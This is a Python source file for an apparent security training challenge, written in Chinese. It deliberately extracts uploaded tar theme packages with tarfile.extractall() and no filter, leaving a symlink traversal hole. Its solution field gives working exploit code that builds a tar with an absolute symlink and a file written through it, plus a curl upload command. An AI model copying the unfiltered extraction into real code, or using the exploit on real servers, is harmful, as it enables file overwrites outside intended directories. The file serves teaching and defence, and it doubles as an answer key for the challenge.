"""主题包解压处的 tar 符号链接穿越。

业务场景是"上传一个主题包（tar），服务端解开到主题目录里"。

这一题跟 `upload/zip_slip` 是一对，而且**结论正好相反**：

  · zip_slip：`zipfile.extractall()` 从 Python 3.6 起就会清理 `..` 和
    绝对路径 —— **标准库默认是安全的**。所以那个洞只能出现在
    "不用标准库、自己手写循环"的地方。

  · 这一题：`tarfile.extractall()` 在 Python 3.13 上**默认不做任何过滤** ——
    **标准库默认是不安全的**。要安全必须显式传 `filter=`。

也就是说：同一件"解压别人的压缩包"的事，zip 和 tar 的默认值是不一样的。
**「我用的标准库，所以应该没问题」这种想法，在压缩包这件事上不成立 ——
你得逐个格式去确认。**

（实测：Python 3.13.12 上不传 `filter` 时越界写成功，并且会抛一条
 DeprecationWarning 说「Python 3.14 will, by default, filter extracted tar archives」。
 filter='tar' 和 filter='data' 都能拦住。）
"""

import io
import os
import shutil
import tarfile

from vuln4all import Vuln, render_template, request

THEME_DIR = "themes"
GUARD_DIR = "protected"

#: 被保护的文件。它被写坏 = 文件落到了主题目录外面。
NOTICE = "notice.txt"
BASELINE = "主题目录的说明文件，正常情况下只有运维会改。\n"

#: 防压缩炸弹。tar 的炸弹比 zip 更容易做（一个成员就能声明超大 size）。
MAX_ARCHIVE = 2 * 1024 * 1024
MAX_TOTAL = 8 * 1024 * 1024
MAX_MEMBERS = 200

GOAL = "让主题包里的文件落到了主题目录外面（覆盖了 protected/notice.txt）"


def member_summary(member):
    """给页面显示用的成员描述。"""
    if member.issym():
        return "符号链接 → %s" % member.linkname
    if member.islnk():
        return "硬链接 → %s" % member.linkname
    if member.isdir():
        return "目录"
    return "%d 字节" % member.size


def list_theme(theme_dir):
    """列出主题目录里的文件和**符号链接**，分开放。

    刻意不用 `rglob` —— 它会把符号链接当成目录跟进去，
    而攻击者留下的那个链接正是指向目录外面的。跟进去就会把别人的文件
    也列出来（而且真出现链接环的时候会转不出来）。
    """
    files, symlinks = [], []
    for entry in sorted(theme_dir.iterdir()):
        if entry.is_symlink():
            symlinks.append("%s -> %s" % (entry.name, os.readlink(entry)))
        elif entry.is_file():
            files.append(entry.name)
        elif entry.is_dir():
            for sub in sorted(entry.rglob("*")):
                if sub.is_symlink():
                    symlinks.append(
                        "%s -> %s"
                        % (sub.relative_to(theme_dir).as_posix(), os.readlink(sub))
                    )
                elif sub.is_file():
                    files.append(sub.relative_to(theme_dir).as_posix())
    return files, symlinks

class TarSymlink(Vuln):
    info = {
        "name": "主题包解压处的 tar 符号链接穿越",
        "author": ["guaidao2"],
        "cwe": "CWE-59",
        "owasp": "A01:2021 - Broken Access Control",
        "difficulty": "困难",
        "description": (
            "上传一个 tar 主题包，服务端用 `tarfile.extractall()` 解开。\n"
            "而这个调用在 Python 3.13 上**默认不过滤任何东西** ——"
            "压缩包里一个指向外部的符号链接，加上一个穿过它的文件，"
            "就能把内容写到主题目录外面去。"
        ),
        "hint": (
            "先传一个正常的 tar（里面放一两个文本文件），看解压结果。\n"
            "然后注意：tar 格式的成员除了「普通文件」，还能是什么类型？\n"
            "（提示：`tarfile.TarInfo` 有一个 `type` 字段，取值包括\n"
            "   REGTYPE、DIRTYPE、SYMTYPE、LNKTYPE……）\n"
            "如果压缩包里先放一个**符号链接**，再放一个**路径穿过那个链接**的文件，\n"
            "解压的时候会发生什么？\n"
            "另外这一题的关键是：服务端用的是 `extractall()` —— 标准库。\n"
            "标准库的默认值在这个场景下安全吗？看页面上的提示。"
        ),
        "solution": (
            "一、先做一个正常主题包确认功能：\n\n"
            "   mkdir -p mytheme && echo 'body{}' > mytheme/style.css\n"
            "   tar -cf theme.tar mytheme\n"
            "   curl -F 'package=@theme.tar;type=application/x-tar' '<上传地址>'\n\n"
            "二、关键：tar 成员可以是**符号链接**，而且可以指向**绝对路径**。\n"
            "   先放一个指向外部目录的链接，再放一个穿过它的普通文件：\n\n"
            "   import io, tarfile\n\n"
            "   with tarfile.open('evil.tar', 'w') as tf:\n"
            "       link = tarfile.TarInfo('escape')\n"
            "       link.type = tarfile.SYMTYPE          # 符号链接\n"
            "       link.linkname = '<受保护目录的绝对路径>'   # 页面给了\n"
            "       tf.addfile(link)                     # 先建链接\n\n"
            "       data = b'主题目录外面被写了东西\\n'\n"
            "       member = tarfile.TarInfo('escape/notice.txt')\n"
            "       member.size = len(data)\n"
            "       tf.addfile(member, io.BytesIO(data)) # 再穿过链接写文件\n\n"
            "三、传上去。`extractall()` 会先把 `escape` 建成符号链接，\n"
            "   然后解析 `escape/notice.txt` 时**跟着链接**走到了外面，\n"
            "   于是文件被写到了受保护目录里。\n\n"
            "为什么标准库会这样：\n\n"
            "  解压 tar 的语义是「把归档里的成员按名字原样铺到磁盘上」。\n"
            "  符号链接是一个**合法**的成员类型，绝对链接也是一个合法的链接目标 ——\n"
            "  旧的 tarfile 老老实实照做。\n"
            "  Python 3.12 加了 `filter=` 参数（PEP 706），但**默认值一时没改**，\n"
            "  为的是不破坏已有代码；3.14 会把默认值改成 `filter='data'`。\n\n"
            "  实测（Python 3.13.12）：\n\n"
            "    extractall(dest)                    越界写成功，抛 DeprecationWarning\n"
            "    extractall(dest, filter='fully_trusted')  越界写成功（等于没加）\n"
            "    extractall(dest, filter='tar')            OutsideDestinationError（拦住）\n"
            "    extractall(dest, filter='data')           AbsoluteLinkError（拦住）\n\n"
            "  顺带：`shutil.unpack_archive()` 的 `filter` 参数**默认也是 None**，\n"
            "  也就是说它走的是同一条不安全的路。\n\n"
            "四、跟 zip_slip 那道题对着看（这一对值得记住）：\n\n"
            "   | | zip | tar |\n"
            "   |---|---|---|\n"
            "   | 标准库默认安全吗 | **安全**（3.6 起清理 `..` 和绝对路径） | **不安全**（3.13 之前都不过滤） |\n"
            "   | 洞一般出现在哪 | 开发者**手写循环**的时候 | 直接用 `extractall()` 就会中 |\n"
            "   | 修法 | 别自己写循环 / 用 `extractall` | **加 `filter='data'`** |\n\n"
            "  结论：**「用的是标准库」不等于「默认值是对的」。**\n"
            "  每换一个格式、每升一个版本，都要重新确认一遍默认行为。"
        ),
        "refs": [
            "https://docs.python.org/3/library/tarfile.html#extraction-filters",
            "https://peps.python.org/pep-0706/",
        ],
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        (ctx.workspace / THEME_DIR).mkdir(parents=True, exist_ok=True)
        (ctx.workspace / GUARD_DIR).mkdir(parents=True, exist_ok=True)
        (ctx.workspace / GUARD_DIR / NOTICE).write_text(BASELINE, encoding="utf-8")

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        theme_dir = ctx.workspace / THEME_DIR
        guard_dir = ctx.workspace / GUARD_DIR

        @app.route("/", methods=["GET", "POST"])
        def index():
            report = None
            if request.method == "POST":
                report = self._handle_upload(ctx, theme_dir)

            notice = (guard_dir / NOTICE).read_text(encoding="utf-8", errors="replace")
            files, symlinks = list_theme(theme_dir)
            return render_template(
                "index.html",
                report=report,
                notice=notice,
                baseline=BASELINE.strip(),
                theme_dir=str(theme_dir),
                guard_dir=str(guard_dir),
                notice_path=str(guard_dir / NOTICE),
                files=files,
                symlinks=symlinks,
            )

        @app.route("/重新开始", methods=["POST"])
        def reset_files():
            shutil.rmtree(theme_dir, ignore_errors=True)
            theme_dir.mkdir(parents=True, exist_ok=True)
            (guard_dir / NOTICE).write_text(BASELINE, encoding="utf-8")
            return render_template(
                "index.html",
                report=None,
                notice=BASELINE,
                baseline=BASELINE.strip(),
                theme_dir=str(theme_dir),
                guard_dir=str(guard_dir),
                notice_path=str(guard_dir / NOTICE),
                files=[],
                symlinks=[],
            )

        return {"": app}

    # ------------------------------------------------------------ 解压逻辑

    def _handle_upload(self, ctx, theme_dir):
        """把 tar 解到主题目录里。洞在 extractall 的默认参数上。"""
        uploaded = request.files.get("package")
        if uploaded is None or not uploaded.filename:
            return {"error": "没选文件"}

        raw = uploaded.read(MAX_ARCHIVE + 1)
        if len(raw) > MAX_ARCHIVE:
            return {"error": "压缩包太大了（上限 %d KB）" % (MAX_ARCHIVE // 1024)}

        try:
            archive = tarfile.open(fileobj=io.BytesIO(raw), mode="r:*")
        except tarfile.TarError as exc:
            return {"error": "这不是一个合法的 tar：%s" % exc}

        members = archive.getmembers()
        if len(members) > MAX_MEMBERS:
            return {"error": "成员太多了（上限 %d 个）" % MAX_MEMBERS}

        total = 0
        for member in members:
            total += max(member.size, 0)
            if total > MAX_TOTAL:
                return {"error": "解压后总量太大，拒绝"}

        summary = [
            {"name": m.name, "kind": member_summary(m)} for m in members[:40]
        ]
        links = [m.name for m in members if m.issym() or m.islnk()]

        try:
            # ↓↓↓ 洞就在这里：没传 filter —— 3.13 的默认是不过滤任何东西 ↓↓↓
            archive.extractall(theme_dir)
            # ↑↑↑ 正确做法：archive.extractall(theme_dir, filter="data")
            #     （或者 "tar"）。3.14 会把默认值改成 "data"，
            #     但你不能等 —— 得显式写出来。 ↑↑↑
        except Exception as exc:  # noqa: BLE001
            return {
                "error": "%s: %s" % (type(exc).__name__, exc),
                "summary": summary,
                "links": links,
            }
        finally:
            archive.close()

        # 判定：解压之后有没有东西落在主题目录外面
        escaped = []
        for member in members:
            target = os.path.realpath(os.path.join(str(theme_dir), member.name))
            if not target.startswith(os.path.realpath(str(theme_dir)) + os.sep):
                escaped.append(member.name)

        if escaped:
            ctx.progress.mark(GOAL)

        return {
            "error": None,
            "summary": summary,
            "links": links,
            "escaped": escaped,
        }

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        """直接看那条说明有没有被改掉 —— 不用记进度。"""
        path = ctx.workspace / GUARD_DIR / NOTICE
        try:
            current = path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            return {GOAL: True}
        return {GOAL: current != BASELINE}

